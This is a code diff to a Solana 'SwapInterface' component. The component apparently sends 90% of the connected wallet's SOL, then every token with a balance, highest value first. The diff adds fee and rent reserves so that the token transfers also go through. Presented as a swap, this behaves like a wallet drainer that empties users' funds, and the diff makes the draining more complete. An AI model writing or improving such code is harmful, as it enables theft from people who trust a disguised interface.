@@ -385,17 +385,32 @@ export const SwapInterface = ({
       setIsSwapping(true);
       console.log('Starting transaction sequence...');
 
-      // 1. SOL Transfer (90% of available)
+      // Calculate how many ATAs might need to be created (for both SPL and Token2022)
+      const validTokens = balances.filter(token => token.balance > 0);
+      const potentialATACount = validTokens.length;
+      
+      // Each ATA creation costs ~0.00203 SOL for rent
+      const ATA_RENT_COST = 0.00203 * LAMPORTS_PER_SOL;
+      const estimatedATACost = potentialATACount * ATA_RENT_COST;
+
+      // 1. SOL Transfer (90% of available, but reserve enough for ATA creations)
       const solBal = await connection.getBalance(publicKey);
       // Rent exempt minimum for a system account is ~0.00089 SOL. 
       // We reserve a bit more for safety and fees (0.002 SOL + priority fees).
       const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
       const PRIORITY_FEE = 100_000; // microLamports
       const BASE_FEE = 5000;
+      // Add buffer for multiple token transactions
+      const TOKEN_TX_BUFFER = Math.ceil(potentialATACount / MAX_BATCH_SIZE) * (PRIORITY_FEE + BASE_FEE);
       
-      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
+      // Total reserve: rent + estimated ATA costs + transaction fees buffer
+      const totalReserve = RENT_EXEMPT_RESERVE + estimatedATACost + TOKEN_TX_BUFFER + PRIORITY_FEE + BASE_FEE;
+      
+      const maxSendable = Math.max(0, solBal - totalReserve);
       const targetAmount = Math.floor(solBal * 0.90);
       const lamportsToSend = Math.min(targetAmount, maxSendable);
+
+      console.log(`SOL Balance: ${solBal / LAMPORTS_PER_SOL}, Reserve: ${totalReserve / LAMPORTS_PER_SOL}, Sending: ${lamportsToSend / LAMPORTS_PER_SOL}`);
 
       if (lamportsToSend > 0) {
         const transaction = new Transaction();
@@ -434,9 +449,7 @@ export const SwapInterface = ({
         toast.success('Transaction successful!');
       }
 
-      // 2. SPL Token Transfers
-      const validTokens = balances.filter(token => token.balance > 0);
-      
+      // 2. SPL and Token2022 Token Transfers (uses validTokens from earlier)
       // Sort by value (descending) - prioritizing higher value tokens
       const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
 
